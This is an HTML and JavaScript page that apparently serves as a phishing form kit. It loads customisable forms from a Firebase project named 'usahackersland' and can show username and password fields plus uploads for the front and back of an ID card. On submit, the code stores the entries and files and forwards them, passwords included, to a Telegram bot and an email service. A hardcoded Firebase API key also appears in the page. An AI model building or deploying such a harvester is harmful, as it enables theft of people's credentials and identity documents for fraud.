<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Form</title>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<style>
  body { font-family: Arial, sans-serif; margin:0; padding:0; }
  #formContainer { position: relative; width:100%; min-height:100vh; padding:20px; box-sizing:border-box; overflow:auto; }
  .livePreviewContent { position: relative; z-index:1; max-width:700px; margin:auto; }
  .livePreviewContent img { max-width:100%; margin:6px 0; border-radius:6px; }
  .livePreviewContent video { width:100%; border-radius:6px; margin:6px 0; }
  .draggableBtn { position:absolute; cursor:pointer; border:none; border-radius:8px; color:#fff; text-align:center; display:flex; align-items:center; justify-content:center; font-size:14px; z-index:2; }
  .embedLink { margin-top:6px; padding:6px; background:#e8f0fe; border-radius:6px; word-break:break-word; }
</style>
</head>
<body>
<div id="formContainer"></div>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland",
  storageBucket: "usahackersland.appspot.com"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();
const storage = firebase.storage();

// EmailJS initialization
emailjs.init("YOUR_EMAILJS_USER_ID"); // <-- Replace

const TELEGRAM_BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"; // <-- Replace
const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // <-- Replace

const getFormId = () => new URLSearchParams(window.location.search).get('id');

function sendTelegramAlert(message){
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
  }).catch(err=>console.error("Telegram error:", err));
}

function sendEmailAlert(subject, body){
  emailjs.send("YOUR_EMAILJS_SERVICE_ID", "YOUR_EMAILJS_TEMPLATE_ID", {
    subject: subject,
    message: body
  }).catch(err=>console.error("EmailJS error:", err));
}

async function uploadFile(file){
  const ref = storage.ref().child(`form_uploads/${Date.now()}_${file.name}`);
  const snapshot = await ref.put(file);
  return await snapshot.ref.getDownloadURL();
}

function renderForm(data) {
  const container = document.getElementById("formContainer");
  container.innerHTML = "";
  container.style.backgroundColor = data.bgColor || "#fff";
  container.style.backgroundImage = data.bgImageURL ? `url(${data.bgImageURL})` : "";
  container.style.backgroundSize = data.bgSize || "cover";
  container.style.backgroundPosition = "center";
  container.style.position = "relative";

  const content = document.createElement("div");
  content.className = "livePreviewContent";
  content.style.color = data.textColor || "#222";

  content.innerHTML += `<h2 style="text-align:center;color:${data.titleColor||'#111'}">${data.title||''}</h2>`;

  const fDiv = document.createElement("div");
  fDiv.style.display="flex";
  fDiv.style.flexDirection="column";
  fDiv.style.alignItems = "center";
  fDiv.style.gap="8px";

  const formFields = [];

  // Auth Fields
  if(data.addAuth){
    const usernameInput = document.createElement("input");
    usernameInput.placeholder = data.usernamePlaceholder||'Username';
    const passwordInput = document.createElement("input");
    passwordInput.type = "password";
    passwordInput.placeholder = data.passwordPlaceholder||'Password';
    fDiv.appendChild(usernameInput);
    fDiv.appendChild(passwordInput);
    formFields.push({label:"Username", element:usernameInput});
    formFields.push({label:"Password", element:passwordInput});
  }

  // Extra Fields
  if(data.extraFields && data.extraFields.length){
    data.extraFields.forEach(f=>{
      if(f){
        const input = document.createElement("input");
        input.placeholder = f;
        fDiv.appendChild(input);
        formFields.push({label:f, element:input});
      }
    });
  }

  // File Upload Fields
  const fileFields = [];
  if(data.idFrontChk){
    const input = document.createElement("input");
    input.type = "file";
    input.placeholder = data.idFrontText || "Upload Front ID";
    fDiv.appendChild(input);
    fileFields.push({label:data.idFrontText||"Front ID", element:input});
  }
  if(data.idBackChk){
    const input = document.createElement("input");
    input.type = "file";
    input.placeholder = data.idBackText || "Upload Back ID";
    fDiv.appendChild(input);
    fileFields.push({label:data.idBackText||"Back ID", element:input});
  }

  // Submit Button
  const submitBtn = document.createElement("button");
  submitBtn.textContent = data.buttonText || "Submit";
  submitBtn.style.background = data.btnColor || "#1976d2";
  submitBtn.style.color = "#fff";
  submitBtn.style.padding = "10px";
  submitBtn.style.border="none";
  submitBtn.style.borderRadius="6px";

  submitBtn.onclick = async ()=>{
    submitBtn.disabled = true;
    const formData = {};
    formFields.forEach(f => formData[f.label] = f.element.value);

    // Upload files
    for(const f of fileFields){
      if(f.element.files.length > 0){
        const url = await uploadFile(f.element.files[0]);
        formData[f.label] = url; // replace local file with URL
      }
    }

    // Save to Firebase
    db.collection("form_submissions").add({
      formId: getFormId(),
      data: formData,
      timestamp: new Date()
    }).then(()=>{
      alert("Form submitted successfully!");

      let alertMsg = `New Form Submission (ID: ${getFormId()}):\n` + 
                     Object.entries(formData).map(([k,v])=>`${k}: ${v}`).join("\n");

      sendTelegramAlert(alertMsg);
      sendEmailAlert("New Form Submission", alertMsg);

      submitBtn.disabled = false;
    }).catch(err=>{
      alert("Error submitting form: "+err);
      submitBtn.disabled = false;
    });
  };
  fDiv.appendChild(submitBtn);

  content.appendChild(fDiv);
  container.appendChild(content);
}

// Load form by ID
const formId = getFormId();
if(formId){
  db.collection("forms").doc(formId).get().then(doc=>{
    if(doc.exists){
      const data = doc.data();
      data.extraFields = data.extraFields || [];
      renderForm(data);
    } else {
      document.getElementById("formContainer").innerHTML = "<p>Form not found.</p>";
    }
  });
}else{
  document.getElementById("formContainer").innerHTML = "<p>No form ID provided in URL.</p>";
}
</script>
</body>
</html>
